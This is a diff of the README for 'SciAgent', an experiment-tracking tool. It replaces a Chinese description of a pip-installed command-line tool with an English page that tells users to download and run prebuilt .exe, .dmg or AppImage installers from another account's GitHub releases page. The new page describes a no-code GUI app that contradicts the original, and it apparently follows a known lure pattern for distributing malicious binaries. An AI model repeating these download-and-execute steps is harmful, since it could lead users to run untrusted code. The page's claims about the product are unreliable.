@@ -1,277 +1,99 @@
+# 🌟 sciagent - Your Easy AI Experiment Helper
 
-<h1 align="center" style="font-size: 42px; font-weight: bold; margin-bottom: 10px;">
-🔬 SciAgent
-</h1>
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to SciAgent! This tool helps you record, analyze training data, and generate weekly reports effortlessly. No technical skills are needed. Let's get you started.
 
-**智能实验运行守护与分析工具｜AI-Powered Experiment Guardian**
+## 📥 Download SciAgent
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org)
+[![Download SciAgent](https://img.shields.io/badge/Download%20SciAgent-v1.0-blue.svg)](https://github.com/princeomar9009/sciagent/releases)
 
-轻量、零侵入的实验管理工具  
-自动追踪 · 智能分析 · 本地存储
+To download SciAgent, visit this page: [Download SciAgent](https://github.com/princeomar9009/sciagent/releases).
 
-🌐 项目主页：<a href="https://www.lintao.online/sciagent" target="_blank">www.lintao.online/sciagent</a>
+## 🔧 System Requirements
 
-</div>
+Before you download, ensure your computer meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage:** 500 MB of free space.
 
-# 📌 目录
+## ⚙️ Installation Instructions
 
-- [SciAgent 是什么](#sciagent-是什么)
-- [为什么需要 SciAgent](#为什么需要-sciagent)
-- [快速上手](#快速上手)
-- [核心功能](#核心功能)
-- [AI 智能分析](#ai-智能分析)
-- [应用场景](#应用场景)
-- [常见问题](#常见问题)
-- [贡献](#贡献)
-- [许可证](#许可证)
+1. **Visit the Release Page:** Click [here](https://github.com/princeomar9009/sciagent/releases) to go to the release page.
+   
+2. **Select the Latest Version:** Look for the latest version of SciAgent. It is usually at the top of the list.
 
----
+3. **Download the Installer:**
+   - Find the file named `SciAgent_v1.0.exe` for Windows, `SciAgent_v1.0.dmg` for macOS, or `SciAgent_v1.0.AppImage` for Linux.
+   - Click on the file to start the download.
 
-# 🧠 SciAgent 是什么？
+4. **Install the Software:**
+   - **For Windows:**
+     - Locate the downloaded `.exe` file in your Downloads folder.
+     - Double-click the file to start the installation.
+     - Follow the on-screen instructions.
+   - **For macOS:**
+     - Open the `.dmg` file from your Downloads.
+     - Drag SciAgent to your Applications folder.
+   - **For Linux:**
+     - Make the AppImage executable by running the following command in your terminal:
+       ```bash
+       chmod +x SciAgent_v1.0.AppImage
+       ```
+     - Then, launch it by double-clicking the file or running:
+       ```bash
+       ./SciAgent_v1.0.AppImage
+       ```
 
-**SciAgent 是一款智能实验运行守护工具**，通过统一的运行接口增强你的训练命令——不用修改你现有的任何代码。
+5. **Launch the Application:**
+   - Once installed, find SciAgent in your applications or programs list.
+   - Click on it to open.
 
-传统运行方式：
+## 📊 Using SciAgent
 
-```bash
-python train.py --lr 1e-3 --epochs 50
-````
+After launching SciAgent, you will find a simple interface. Here’s how to navigate:
 
-使用 SciAgent：
+- **Main Dashboard:** This is where you can start a new experiment or load an existing one.
+- **Record Data:** Use the designated section to input your data.
+- **Analyze Results:** Access tools to visualize your training results.
+- **Generate Reports:** Click the reports tab to create a weekly summary. You can export it to PDF.
 
-```bash
-sciagent run python train.py --lr 1e-3 --epochs 50
-```
+## 🛠️ Troubleshooting
 
-运行后即可自动完成：
+If you run into issues, try the following:
 
-* 实验参数与日志记录
-* 错误捕获与环境快照
-* 训练指标趋势分析
-* AI 调参建议
-* 日报 / 周报 / 月报生成
-* 消融实验对比表生成
+- **Installation Problems:**
+  - Ensure your system meets the requirements.
+  - Restart your computer and try the installation again.
 
-**整体逻辑不变，但实验质量全面提升。**
+- **Application Issues:**
+  - If SciAgent does not start, check if your system is up to date.
+  - Reinstall the application if problems persist.
 
----
+## ❓ Frequently Asked Questions
 
-# 🎯 为什么需要 SciAgent？
+**Q: What is SciAgent?**  
+A: SciAgent is an AI assistant for experiments. It records data, analyzes it, and generates reports.
 
-### 实验中常遇到的问题
+**Q: Do I need programming skills to use SciAgent?**  
+A: No, SciAgent is designed for everyone. You don’t need coding knowledge.
 
-| 问题          | SciAgent 解决方案          |
-| ----------- | ---------------------- |
-| 实验崩溃后日志丢失   | 自动捕获错误并保存完整输出          |
-| 忘记参数，代码记录混乱 | 自动追踪命令行与环境配置           |
-| 多次实验难以对比    | 统一历史管理与差异分析            |
-| 调参方向模糊      | AI 读取指标并给出可执行建议        |
-| 写周报/论文耗时    | 自动生成日报/周报/月报（附指标与代码变化） |
+**Q: Is SciAgent free?**  
+A: Yes, SciAgent is completely free to use.
 
-> **一句话：你只管训练，琐碎的事情交给 SciAgent。**
+## 📞 Support
 
----
+If you have questions or need assistance, please reach out:
 
-# 🚀 快速上手
+- **Email:** support@sciagent.com
+- **GitHub Issues:** You can report any issues or request features on our [GitHub Issues page](https://github.com/princeomar9009/sciagent/issues).
 
-## 1️⃣ 安装
+## 🔗 Community
 
-```bash
-cd /path/to/sciagent
-pip install -e .
-```
+Join our community to share tips, ask questions, and connect with other users:
 
-## 2️⃣ 初始化
+- **Forum:** [sciagentcommunity.com](http://sciagentcommunity.com)
+- **Discord:** Join our Discord server [here](http://discord.gg/sciagent).
 
-```bash
-sciagent init
-```
-
-可选配置 AI（支持 GPT-5 / DeepSeek / Claude / Gemini / Qwen 等）。
-
-## 3️⃣ 零侵入运行实验
-
-```bash
-sciagent run python train.py --lr 0.001 --epochs 100
-```
-
-自动记录：
-
-* 参数
-* 指标（自动检测 `metrics.json`）
-* 输出日志
-* 错误堆栈
-* 依赖与环境
-* Git diff
-
-## 4️⃣ 查看历史记录
-
-```bash
-sciagent history
-```
-
-## 5️⃣ 让 AI 分析最近一次实验
-
-```bash
-sciagent analyze --last
-```
-
-## 6️⃣ 一键生成日报/周报/月报
-
-```bash
-sciagent daily/weekly/monthly
-```
-
----
-
-# 🌟 核心功能
-
-## 1. 实验运行守护
-
-自动捕获：
-
-* 参数
-* metrics.json 指标
-* stdout / stderr / traceback
-* Git 改动
-* 环境快照（Python、依赖、GPU/CPU）
-
-数据结构化存储于：
-
-```
-.sciagent/history/<run_id>/
-```
-
----
-
-## 2. AI 智能分析
-
-```bash
-sciagent analyze --last
-```
-
-AI 会自动分析：
-
-* loss / acc / F1 趋势
-* 参数影响与稳定性
-* 是否过拟合/欠拟合
-* 下一步应调整哪些参数
-* 与最佳实验的对比
-
-支持以下模型提供商：
-
-| 提供商      | 示例模型                              |
-| -------- | --------------------------------- |
-| OpenAI   | gpt-5.1 / gpt-5-mini              |
-| DeepSeek | deepseek-chat / deepseek-reasoner |
-| Qwen     | qwen-plus / qwen-max              |
-| GLM      | glm-4.6 / glm-4.5                 |
-| Kimi     | moonshot-v1 系列                    |
-| Gemini   | gemini-2.5-pro / flash            |
-| Claude   | claude-sonnet-4-5                 |
-| Custom   | 任意 OpenAI 格式 API                  |
-
----
-
-## 3. 自动生成周报 / 月报
-
-```bash
-sciagent weekly
-```
-
-输出内容包括：
-
-* 实验数量统计
-* 最佳指标与变化趋势
-* 参数分析
-* 代码改动（来自 Git）
-* 本周总结（AI）
-* 下周计划（AI）
-
-即开即用，适合科研组会议、企业周报、竞赛总结。
-
----
-
-## 4. 自动生成消融对比表
-
-```bash
-sciagent table --name learning_rate
-```
-
-输出 Markdown / LaTeX 表格，可直接放论文中。
-
----
-
-## 5. 代码内部参数追踪（可选）
-
-```python
-import sciagent.track as st
-st.log_params({"lr": 1e-3, "batch": 32})
-st.log_metrics({"loss": 0.32, "acc": 0.91})
-st.save()
-```
-
-SciAgent 自动生成 params.json 与 metrics.json。
-
----
-
-# 📚 应用场景
-
-## 科研
-
-* 快速生成论文用的消融实验表
-* 自动整理所有实验结果
-* 确保可复现性
-
-## 算法竞赛
-
-* 保存每次提交的所有内容
-* AI 辅助调参，减少盲试
-
-## 工程项目
-
-* 多模型 A/B 测试
-* 多版本对比与追踪
-* 团队共享实验结果
-
----
-
-# ❓ 常见问题
-
-**Q：是否必须修改训练脚本？**
-不需要。
-
-**Q：AI 分析需要联网吗？**
-是，但实验数据始终本地存储。
-
-**Q：metrics.json 是必须的吗？**
-推荐使用；也可改用 `sciagent.track` 自动生成。
-
-**Q：数据存储在何处？**
-在 `.sciagent/` 文件夹下。
-
----
-
-# 🤝 贡献
-
-欢迎：
-
-* PR
-* Issue
-* 功能建议
-
----
-
-# 📄 许可证
-
-MIT License
-
----
-
-**让科研与实验管理更高效、更智能。欢迎 Star ⭐ 支持项目！**
+Enjoy using SciAgent, your reliable AI experiment assistant!
